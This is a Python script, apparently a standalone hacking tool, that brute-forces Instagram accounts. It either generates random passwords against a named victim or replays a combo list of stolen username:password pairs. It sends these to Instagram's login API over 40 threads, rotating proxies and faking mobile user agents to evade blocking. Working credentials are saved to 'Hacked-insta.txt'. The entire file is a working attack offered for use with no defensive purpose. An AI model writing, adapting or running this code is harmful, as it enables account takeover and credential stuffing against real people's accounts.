import os
try:
	import requests,random,threading
	from time import sleep
except Exception as Joker:exit(Joker)
PRNT=threading.Lock()
def vv1ck(*a, **b):
	with PRNT:print(*a, **b)
sent=requests.session()
uuid = sent.get('https://httpbin.org/uuid')
red = "\033[1;31;40m";yel = '\033[1;33;40m'
grn = '\033[1;32;40m';wit = "\033[1;37;40m"
errorPas = 'The password you entered is incorrect';login = 'logged_in_user'
errorNam = "Please check your username and try again."
none = 'Invalid Parameters'
band_use = 'inactive user'
secure = 'challenge_required'
withs = 'Please wait a few minutes before you try again';errReq = 'Bad request'
errorFUOt = "We're working on it and we'll get it fixed as soon as we can."
def Exit():exit(0)
def SeveHck(user,pess):
	with open('Hacked-insta.txt', 'a') as J:
		J.write(user+':'+pess+'\n')
def SeveScour(user,pess):
	with open('secure-insta.txt', 'a') as J:
		J.write(user+':'+pess+'\n')
def SeveBand(user,pess):
	with open('Band-insta.txt', 'a') as J:
		J.write(user+':'+pess+'\n')
def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

class randoomPas:
	def __init__(self):
		global modeRnd
		print('━━━━━━━━━━━━━━━Random Hack━━━━━━━━━━━━━━')
		self.mod = modeRnd
		self.user=''
		if modeRnd == '1':self.user = input("[$] Enter the victim's username : ")
		elif modeRnd == 2:pass
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit('\n[-] The file name is incorrect !\n')
		self.lst1 = 'm5nbvc_xzl9paqk4jhgfd7swert.yu2io'
		self.lst2 = '!q5wKert1y@.uio2p8as_dfg3hjVklzx?cv7bnJm0@'
		print(' ')
		self.random_Pass()
	def random_Pass(self):
		lst1 = 'm5nbvc_xzl9paqk4jhgfd7swert.yu2io'
		lst2 = '!q5wKert1y@.uio2p8as_dfg3hjVklzx?cv7bnJm0@'
		while True:
			sleep(3)
			if self.mod == '2':
				self.user = str(''.join((random.choice(lst1) for i in range(4))))
			pess = str(''.join((random.choice(lst2) for i in range(11))))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			headers = {
				'Host':'i.instagram.com',
				'Accept':'*/*',
				'User-Agent': User_Agent(),
				'Cookie':'missing', 
				'Accept-Encoding':'gzip, deflate', 
				'Accept-Language':'en-US', 
				'X-IG-Capabilities':'3brTvw==',
				'X-IG-Connection-Type':'WIFI', 
				'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', }
			data = {
				'uuid':uuid.json()['uuid'],
				'password':pess,
				'username':self.user, 
				'device_id':uuid.json()['uuid'], 
				'from_reg':'false', 
				'_csrftoken':'missing', 
				'login_attempt_countn':'0'}
			try:
				PROXY = {"https://":run,"http://":run}
				get = sent.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					vv1ck(grn+f'[+] Hacked >> {self.user}:{pess}')
					threading.Thread(target=SeveHck(self.user,pess)).start()
				elif errorPas in get.text:
					vv1ck(red+f'[-] Not hacked >> {self.user}:{pess}')
				elif 'unusable_password' in get.text:
					vv1ck(red+f'[-] Not hacked >> {self.user}:{pess}')
				elif errorNam in get.text:
					vv1ck(red+f'[-] Not hacked >> {self.user}:{pess}')
				elif band_use in get.text:
					vv1ck(yel+f'[-] Account Banned >> {self.user}:{pess}')
					threading.Thread(target=SeveHck(self.user,pess)).start()
				elif secure in get.text:
					vv1ck(yel+f'[!] secure >> {self.user}:{pess}')
					threading.Thread(target=SeveScour(self.user,pess)).start()
				elif 'ip_block' in get.text:
					vv1ck(red+'[-] bad proxy ..')
				elif errorFUOt in get.text:
					vv1ck(red+f'[-] Not hacked >> {self.user}:{pess}')
				elif withs in get.text:
					vv1ck(red+'[-] bad proxy ..')
				elif errReq in get.text:pass
				elif none in get.text:pass
				else: print(get.text)
			except requests.exceptions.ConnectionError:
				vv1ck(red+'[-] bad proxy ..')
			except KeyboardInterrupt:Exit()
class ComboHck:
	def __init__(self):
		print('━━━━━━━━━━━━━━━Combo Hack━━━━━━━━━━━━━━')
		self.c = input('[$] Enter name file combo : ')
		try:self.file = open(self.c, 'r')
		except FileNotFoundError:
			exit('\n[-] The file name is incorrect !\n')
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit('\n[-] The file name is incorrect !\n')
		self.msg = input("""[$] Do you use a computer or mobile phone?
[1] - computer 
[2] - mobile """)
		print(' ')
		self.Trts()
	def Log_Combo(self):
		while True:
			list = self.file.readline().split('\n')[0]
			user = list.split(':')[0]
			if user=='':
				threading.Thread(target=Exit).start()
				exit()
			try:pess = list.split(':')[1]
			except IndexError:pass
			else:
				proxylist = []
				for pro in self.proxy:
					proxylist.append(pro)
					run = str(random.choice(proxylist))
				headers = {
					'Host':'i.instagram.com',
					'Accept':'*/*',
					'User-Agent': User_Agent(),
					'Cookie':'missing', 
					'Accept-Encoding':'gzip, deflate', 
					'Accept-Language':'en-US', 
					'X-IG-Capabilities':'3brTvw==',
					'X-IG-Connection-Type':'WIFI', 
					'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', }
				data = {
					'uuid':uuid.json()['uuid'],
					'password':pess,
					'username':user, 
					'device_id':uuid.json()['uuid'], 
					'from_reg':'false', 
					'_csrftoken':'missing', 
					'login_attempt_countn':'0'}
				try:
					if self.msg == '1':PROXY = {"https://":run,"http://":run}
					else:PROXY = {"https":run,"http":run}
					get = sent.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies=PROXY, allow_redirects=True)
					if login in get.text:
						print(grn+f'[+] Hacked >> {user}:{pess}')
						threading.Thread(target=SeveHck(user,pess)).start()
					elif errorPas in get.text:
						vv1ck(red+f'[-] Not hacked >> {user}:{pess}')
					elif 'unusable_password' in get.text:
						vv1ck(red+f'[-] Not hacked >> {user}:{pess}')
					elif errorNam in get.text:
						vv1ck(red+f'[-] Not hacked >> {user}:{pess}')
					elif band_use in get.text:
						vv1ck(yel+f'[-] Account Banned >> {user}:{pess}')
						threading.Thread(target=SeveHck(user,pess)).start()
					elif secure in get.text:
						vv1ck(yel+f'[!] secure >> {user}:{pess}')
						threading.Thread(target=SeveScour(user,pess)).start()
					elif 'ip_block' in get.text:
						vv1ck(red+'[-] bad proxy ..')
					elif errorFUOt in get.text:
						vv1ck(red+f'[-] Not hacked >> {user}:{pess}')
					elif withs in get.text:
						vv1ck(red+f'[-] Not hacked >> {user}:{pess}')
					elif errReq in get.text:pass
					elif none in get.text:pass
					else: vv1ck(get.text)
				except requests.exceptions.ConnectionError:
					print(red+'[-] bad proxy ..')
				except KeyboardInterrupt:Exit()
	def Trts(self):
		theards =[]
		for i in range(40):
			trts = threading.Thread(target=self.Log_Combo)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
def start():
	global modeRnd
	mode = input("""\t\t\t\t Brute Force instagram
        /\ /| https://vv1ck.github.io
       |||| |
        \ | \\
    _ _ /  @ @
  /    \   =>X<=  
/|      |   / [1]- hack from combo list
\|     /__| | [2]- random hack
  \_____\ \__\\ 
Enter Mode : """)
	if mode == '2':
		modeRnd = input("""
[1] - hack penetration + random password
[2] - hack random username and password 
[3] - Go Back << : """)
		if modeRnd == '1':randoomPas()
		elif modeRnd =='2':randoomPas()
		elif modeRnd == '3':
			os.system('clear')
			return start()
		else:exit('Option does not exist')
	elif mode == '1':
		ComboHck()
	else:
		print("""
Please choose one of the numbers mentioned only [ 1 / 2 ]""")
start()
